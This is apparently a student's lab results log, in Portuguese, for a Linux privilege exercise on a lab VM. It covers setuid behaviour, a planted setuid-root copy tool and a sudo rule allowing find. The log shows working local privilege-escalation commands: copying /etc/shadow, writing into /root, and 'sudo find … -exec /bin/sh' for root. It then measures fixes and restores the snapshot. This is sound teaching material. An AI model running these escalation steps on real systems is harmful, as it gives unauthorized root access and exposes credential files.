# Lab 6 — O modelo de privilégios, setuid e sudo

Results log. Um bloco por exercício: o que se correu, o que se observou, o que prova, o
que vai para o Lab report 3.

Status: **Ex. 1–6 feitos**, máquina reposta (`lab6-clean`).

---

## Setup (pre-lab)

- VM `ssc-lab` (Ubuntu 24.04.5 LTS, aarch64), user `student`, via `ssh ssc`
  (`student@127.0.0.1:2222`). Snapshot `lab6-clean` tirado antes de tocar em nada.
- Atacante: a conta de serviço do Lab 1, `svc-report` — `uid=997(svc-report)
  gid=988(svc-report) groups=988(svc-report)`, sem grupos extra.
- Ferramenta semeada: `/usr/local/bin/backup-tool`, `-rwsr-xr-x root root`, ELF aarch64
  `setuid` *stripped* (133496 bytes) — fora do `dpkg`, logo sem versão nem origem
  rastreável.
- Regra semeada: `/etc/sudoers.d/svc-report` (`-r--r----- root root`, 45 bytes),
  `svc-report ALL=(ALL) NOPASSWD: /usr/bin/find`.
- `sudo` do `student` **pede password** (é o esperado: só a regra de `svc-report` é
  `NOPASSWD`). Não se usa o `sudo` do próprio para escalar em C/D — só para ler a política,
  aplicar e reverter os fixes (como o enunciado manda).

A shell de atacante:

```console
$ sudo -u svc-report -s
$ id
uid=997(svc-report) gid=988(svc-report) groups=988(svc-report)
```

---

## P1 / P2 (avaliadas)

**P1.** real UID = identidade a que o processo pertence (quem o lançou; recursos, sinais,
limites); effective UID = identidade usada pelo kernel nas decisões de acesso. Numa
permissão de ficheiro o kernel verifica o **effective** UID (+ grupos suplementares).

**P2.** No `execve` de um ficheiro com o bit setuid, o kernel põe o **effective** UID igual
ao UID do **dono do ficheiro** (`root`), guardando o anterior no *saved set-user-ID*. O
processo passa a carregar o privilégio do dono do binário; o real UID continua a ser o do
chamador.

---

## Ex. 1 — a transição setuid (Parte A)

```
$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 72056 May 30  2024 /usr/bin/passwd

# noutra shell, com o passwd parado no prompt:
$ ps -o pid,ruser,euser,cmd -C passwd
    PID RUSER    EUSER    CMD
  10527 student  root     passwd

$ grep -E '^(Uid|Gid):' /proc/10527/status
Uid:	1000	0	0	0
Gid:	1001	1001	1001	1001
```

Leitura: `Uid: real=1000 effective=0 saved=0 fs=0`. O setuid mexeu **só** no euid; o gid
ficou intacto (`1001 1001 1001 1001`) — o binário é setuid, não setgid. É esta assimetria
que, mais tarde, explica o grupo das cópias do `backup-tool`.

**1a.** Mecanismo: bit setuid no inode + `execve`. O `passwd` precisa porque escreve
`/etc/shadow` (`0640 root:shadow`) e o utilizador comum não o pode abrir; um editor não
precisa porque escreve ficheiros que o utilizador já possui. Se mantivesse euid 0 toda a
execução, o binário passaria a ser *um processo root que aceita input*: qualquer leitura de
configuração, variável de ambiente, `LD_PRELOAD` ou overflow seria código como root. A
janela mínima de privilégio é a diferença entre "tem root para escrever uma linha" e "é
root".

Como o `passwd` não tem tty neste modo, o processo foi mantido vivo com um FIFO aberto nos
dois sentidos (`exec 3<>/tmp/pwfifo; passwd </tmp/pwfifo &`) — sem writer, o `read` bloqueia
e o processo fica parado no prompt, que é o estado que o `ps` precisa de apanhar.

---

## Ex. 2 — a superfície setuid (Parte B)

```
$ find / -perm -4000 -type f 2>/dev/null | sort
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/local/bin/backup-tool
```

```
$ find / -perm -2000 -type f 2>/dev/null | sort
/usr/bin/chage
/usr/bin/crontab
/usr/bin/expiry
/usr/bin/ssh-agent
/usr/lib/aarch64-linux-gnu/utempter/utempter
/usr/lib/w3m/w3mimgdisplay
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
```

Treze setuid, oito setgid. Doze dos treze setuid vêm do `dpkg`
(`dpkg -S` resolve todos); **um não**: `/usr/local/bin/backup-tool`. Esse é o único que
ninguém reviu, que não tem versão nem actualização, e que — ao contrário do `passwd`, que
valida argumentos e abandona o privilégio — é um `cp` com euid 0, logo aceita dois caminhos
arbitrários.

**2a.** Design smell: o privilégio não deriva de quem executa, é concedido pelo inode, e
tem de ser justificado entrada a entrada. Um binário da distribuição tem revisão, CVEs
fechados e actualização pelo gestor de pacotes; um binário local setuid root não tem nada
disso — a única coisa que o distingue de um backdoor é a intenção de quem o instalou.

---

## Ex. 3 — explorar (Parte C)

Chamada benigna, leitura directa e leitura pela ferramenta, tudo como `svc-report`:

```console
$ /usr/local/bin/backup-tool /etc/hostname /tmp/hn && cat /tmp/hn
ssc-lab

$ cat /etc/shadow
cat: /etc/shadow: Permission denied

$ /usr/local/bin/backup-tool /etc/shadow /tmp/leak; echo "rc=$?"
rc=0

$ ls -l /tmp/leak
-rw-r----- 1 root svc-report 944 Oct 28 11:32 /tmp/leak
$ head -2 /tmp/leak
root:*:20679:0:99999:7:::
daemon:*:20679:0:99999:7:::
```

Rota de **escrita** (a segunda que o 3a pede para descrever, aqui medida):

```console
$ printf 'planted-by-svc-report\n' > /tmp/payload
$ /usr/local/bin/backup-tool /tmp/payload /root/pwned.txt; echo "rc=$?"
rc=0

# como student, a verificar:
$ sudo ls -l /root/pwned.txt
-rw-rw-r-- 1 root svc-report 22 Oct 28 11:32 /root/pwned.txt
$ sudo cat /root/pwned.txt
planted-by-svc-report
```

**3b.** A cópia correu com **effective UID 0** (o `execve` promoveu-o e a ferramenta nunca o
baixou). O kernel fez a verificação de `/etc/shadow` contra essa identidade **efectiva** e
passou; o real UID continuou a ser `svc-report`. O que escalou não foi o bit setuid (que o
`passwd` usa legitimamente), foi a combinação: **privilégio ambiente** (root durante toda a
execução) + **argumentos arbitrários** (origem e destino escolhidos pelo chamador). Um `cp`
root é um `cat` root e um `tee` root — root-equivalente à distância de dois argumentos.

### Porque a cópia é legível (e porque isso não é acidente)

```
$ ls -l /etc/shadow /etc/ssh/ssh_host_ed25519_key /tmp/leak /tmp/hostkey
-rw-r----- 1 root shadow  944 /etc/shadow
-rw------- 1 root root    399 /etc/ssh/ssh_host_ed25519_key
-rw-r----- 1 root svc-report 944 /tmp/leak           <- legível pelo grupo
-rw------- 1 root svc-report 399 /tmp/hostkey        <- NÃO legível, nem pelo grupo
```

O `cp` sem `-p` cria o destino com `mode = src_mode & ~umask`, **owner = euid (root)** e
**group = egid do processo** — que continua a ser o de `svc-report`, porque o setuid só
mexeu no euid (ver `Uid/Gid` no Ex. 1). Resultado: `shadow` (`0640`) sai `0640 root:svc-report`
e é legível; a host key (`0600`) sai `0600 root:svc-report` e **não** é legível por
`svc-report`. A mesma ferramenta, dois ficheiros root-only, dois resultados diferentes —
o que a torna útil é o modo do original, não o privilégio da cópia. Consequência honesta
para o relatório: neste image a cópia do `shadow` não dá hashes (todas as contas com `*`
excepto as que já tinham hash), mas o **canal** está aberto para qualquer ficheiro `064x`.

### Gotcha: a mensagem é do `cp`

```
$ /usr/local/bin/backup-tool /etc/shadow
/usr/local/bin/backup-tool: missing destination file operand after '/etc/shadow'
Try '/usr/local/bin/backup-tool --help' for more information.

$ /usr/local/bin/backup-tool
/usr/local/bin/backup-tool: missing file operand
```

Duas mensagens diferentes, ambas do `cp` — e é a assinatura que identifica o que o binário
é antes de se perceber o que ele pode.

---

## Ex. 4 — a política de sudo (Parte D)

```console
# como student
$ sudo cat /etc/sudoers.d/svc-report
svc-report ALL=(ALL) NOPASSWD: /usr/bin/find

# como svc-report
$ sudo -ln
Matching Defaults entries for svc-report on ssc-lab:
    env_reset, mail_badpass, secure_path=..., use_pty

User svc-report may run the following commands on ssc-lab:
    (ALL) NOPASSWD: /usr/bin/find

$ sudo find /etc/hostname -exec id \;
uid=0(root) gid=0(root) groups=0(root)

$ sudo find /etc/hostname -exec /bin/sh -c "id; hostname" \;
uid=0(root) gid=0(root) groups=0(root)
ssc-lab
```

`sudo -ln` lista **um** comando; o que ele mostra não é o alcance. O alcance é a união dos
poderes do binário: `find` tem `-exec` (executa por cada caminho), `-delete`, `-fprintf`
(escreve onde quiser) e `-ok`. Qualquer um deles reabre o root.

**4a.** Técnica: `-exec <cmd> \;` corre `<cmd>` com o euid do `find`, i.e. 0. Classe geral:
**comando permitido que executa outros programas** (*shell escape*), a família do GTFOBins
— `find`, `vi`, `less`, `awk`, `tar`, `git`, `python`. `NOPASSWD` só retira o atrito.

**4b.** "Um comando" só é um poder limitado se o comando for incapaz de transferir
privilégio: não lança outros programas, não interpreta linguagem, não lê/escreve
ficheiros arbitrários e não carrega código do ambiente (`LD_PRELOAD`, `PYTHONPATH`,
`-exec`). Basta uma dessas capacidades e o direito de correr o comando é o direito a tudo o
que ele alcança. A regra nomeia um binário; o poder concedido é a união dos poderes desse
binário.

---

## Ex. 5 — fechar o setuid (Parte E)

### 5a — remover o bit

```console
$ sudo chmod u-s /usr/local/bin/backup-tool
$ ls -l /usr/local/bin/backup-tool
-rwxr-xr-x 1 root root 133496 Sep  4 08:13 /usr/local/bin/backup-tool

# como svc-report:
$ /usr/local/bin/backup-tool /etc/shadow /tmp/leak2; echo "read rc=$?"
/usr/local/bin/backup-tool: cannot open '/etc/shadow' for reading: Permission denied
read rc=1
$ /usr/local/bin/backup-tool /etc/ssh/ssh_host_ed25519_key /tmp/hostkey2; echo "hostkey rc=$?"
/usr/local/bin/backup-tool: cannot open '/etc/ssh/ssh_host_ed25519_key' for reading: Permission denied
hostkey rc=1
$ /usr/local/bin/backup-tool /tmp/payload /root/pwned2.txt; echo "write rc=$?"
/usr/local/bin/backup-tool: cannot stat '/root/pwned2.txt': Permission denied
write rc=1
```

As duas rotas fechadas com uma operação. Princípio: **menor privilégio** — o processo corre
com a identidade de quem o lança porque nunca demonstrou precisar de outra. Custo: a
ferramenta deixa de copiar ficheiros de outros donos — que era exactamente o excesso; o
backup dos dados do serviço continua a funcionar.

### 5b — a rota da capability, medida

Tabela obtida nesta imagem, com o setuid já removido:

| grant em `/usr/local/bin/backup-tool` | `backup-tool /etc/shadow /tmp/leak` | escrita em `/root/` |
|---|---|---|
| `cap_dac_read_search+ep` | **sucede** (`rc=0`, cópia legível) | falha: `cannot create regular file '/root/pwned3.txt': Permission denied` |
| `cap_dac_override+ep` | **sucede** (`rc=0`) | **sucede** (`-rw-rw-r-- 1 svc-report svc-report`) |
| nenhuma (`setcap -r`) | falha: `cannot open '/etc/shadow' for reading: Permission denied` | falha |

`getcap` confirma cada estado (`cap_dac_read_search=ep`, depois `cap_dac_override=ep`, depois
vazio). Reproduz exactamente o que o enunciado avisa: o grant mais estreito **reduziu o raio
de explosão** (perdeu a escrita) e **não fechou** o buraco (a leitura continua aberta).

Diferença entre as duas: `CAP_DAC_READ_SEARCH` contorna leitura e *directory search*;
`CAP_DAC_OVERRIDE` contorna leitura, escrita e execução (esta só onde já existe bit de
execução). Ambas deixam a leitura de 3a intacta.

### 5c — o que teria de ser verdade

Para "uma capability em vez de root" **fechar** um buraco e não apenas estreitá-lo, o poder
legítimo tem de ser **disjunto** do poder que o ataque precisa. Aqui não é: o trabalho de um
`cp` é ler qualquer ficheiro e escrevê-lo noutro sítio, e o ataque é precisamente ler o que
não pode e escrever onde não deve — a capability que o ajuda a trabalhar é a que lhe permite
atacar. Capabilities servem quando o privilégio necessário é estreito *e* não coercivo
(`cap_net_bind_service` para a porta 80).

Das três rotas, fecham: **remover o bit** (5a) ou **constranger o que a ferramenta toca**
(lista fixa de origem/destino, sem caminhos do chamador). Custo: a primeira retira a
capacidade de tocar em ficheiros de outros donos e obriga a rever quem a invoca; a segunda
mantém o privilégio ambiente e passa a exigir validação correcta em cada alteração — mais
código, mais superfície. A primeira é a mais barata de auditar: um `find / -perm -4000`
deixa de a listar.

---

## Ex. 6 — fechar a política (Parte E)

Função legítima declarada: procurar nos próprios logs. Isso precisa de **leitura** em
`/var/log/svc-report`, não de root — logo concede-se por posse de grupo, não por `sudo`.

```console
# estado antes: a regra existe e o log nem sequer existe
$ sudo ls -ld /var/log/svc-report
drwxr-xr-x 2 root root 4096 ...        # (criado para o teste)

# o fix
$ sudo rm /etc/sudoers.d/svc-report
$ sudo chgrp -R svc-report /var/log/svc-report
$ sudo chmod -R g+rX,o-rwx /var/log/svc-report
$ sudo visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/90-cloud-init-users: parsed OK
/etc/sudoers.d/README: parsed OK
$ sudo ls -ld /var/log/svc-report /var/log/svc-report/run.log
drwxr-x--- 2 root svc-report 4096 ... /var/log/svc-report
-rw-r----- 1 root svc-report   49 ... /var/log/svc-report/run.log

# como svc-report: a função continua, a escalada morreu
$ cat /var/log/svc-report/run.log
2026-10-28 report generated ok
2026-10-28 rotate
$ sudo -ln
sudo: a password is required
$ sudo find /etc/hostname -exec id \;
sudo: a terminal is required to read the password; either use the -S option ...
sudo: a password is required

# e do lado do administrador:
$ sudo -l -U svc-report
User svc-report is not allowed to run sudo on ssc-lab.
```

**6a.** O `sudo -ln` já não lista o `find` — não lista nada — e a invocação da Parte D passa a
pedir password e a ser recusada (`sudo -l -U` confirma: "not allowed"). A função pretendida
mantém-se por outro caminho: o serviço lê os seus logs por posse de grupo, sem nunca
abandonar a sua identidade. Se a função exigisse mesmo root, a alternativa segura seria um
*wrapper* dedicado — caminho absoluto, sem interpretação de argumentos, lista de logs fixa —
e nunca o `find` genérico. A regra original não podia ser "apertada": qualquer variante que
aceite um caminho e `-exec` volta a ser uma shell root.

---

## Reposição do `lab6-clean`

Tudo revertido e verificado (o enunciado pede-o, e o Lab 8 reusa a máquina):

```console
$ sudo install -m 0440 -o root -g root /tmp/svc-report.sudoers.orig /etc/sudoers.d/svc-report
$ sudo chmod u+s /usr/local/bin/backup-tool
$ sudo setcap -r /usr/local/bin/backup-tool      # (já estava)
$ sudo rm -rf /var/log/svc-report /root/pwned*.txt /tmp/leak* /tmp/hostkey* ...

$ ls -l /usr/local/bin/backup-tool
-rwsr-xr-x 1 root root 133496 Sep  4 08:13 /usr/local/bin/backup-tool
$ getcap /usr/local/bin/backup-tool
(empty)
$ sudo cat /etc/sudoers.d/svc-report
svc-report ALL=(ALL) NOPASSWD: /usr/bin/find
$ sudo visudo -c
/etc/sudoers: parsed OK   (+ 3 drop-ins)
$ sudo -l -U svc-report
User svc-report may run the following commands on ssc-lab:
    (ALL) NOPASSWD: /usr/bin/find
$ sudo -u svc-report /usr/local/bin/backup-tool /etc/hostname /tmp/v && cat /tmp/v
ssc-lab
```

Nota de limpeza: os ficheiros criados em `/tmp` pelo atacante ficaram `root`-owned (o euid
da ferramenta), e o sticky bit de `/tmp` impede o `student` de os apagar — o `rm` tem de ser
feito com `sudo`.

---

## Notas de execução (o que custou tempo)

1. **A mensagem de erro é do `cp`.** `missing destination file operand after '/etc/shadow'`
   (um argumento) vs `missing file operand` (zero). Identifica o binário antes de se
   perceber o que ele pode.
2. **A cópia herda o modo do original.** `shadow` `0640` → cópia legível; host key `0600`
   → cópia ilegível. O privilégio não decide a legibilidade da cópia; o modo da origem e o
   egid decidem.
3. **`sudo -ln` lista o comando, não o alcance.** Ler a política sem ler o manual do
   binário permitido é metade da análise.
4. **`sudo -n` não é `sudo -l`.** No fim, `sudo -ln` responde `a password is required` (não
   `not allowed`); a resposta limpa vem de `sudo -l -U svc-report`, corrida como root.

---

## Report mapping

| Item do relatório | Fonte aqui | Forma |
|---|---|---|
| P1 | Ex. 1 (`Uid:` real/effective) | texto, **obrigatório** |
| P2 | Ex. 1 (`Uid: 1000 0 0 0`) | texto, **obrigatório** |
| 1a | `ps -o ruser,euser` + `Gid` | texto |
| 2a | Ex. 2 listas + veredicto | texto + tabela |
| 3a / 3b | Ex. 3 leak + `/root/pwned.txt` | texto (transcrição) |
| 4a / 4b | Ex. 4 `sudo -ln` + `-exec id` | texto (transcrição) |
| 5a / 5b | Ex. 5 reteste + tabela de capabilities | texto + tabela |
| 5c | Ex. 5 (disjunção de poderes) | texto, **a pergunta real** |
| 6a | Ex. 6 prova dupla (função vive, escalada morta) | texto |
| apêndice | Reflexão (200–300 palavras) | prosa |
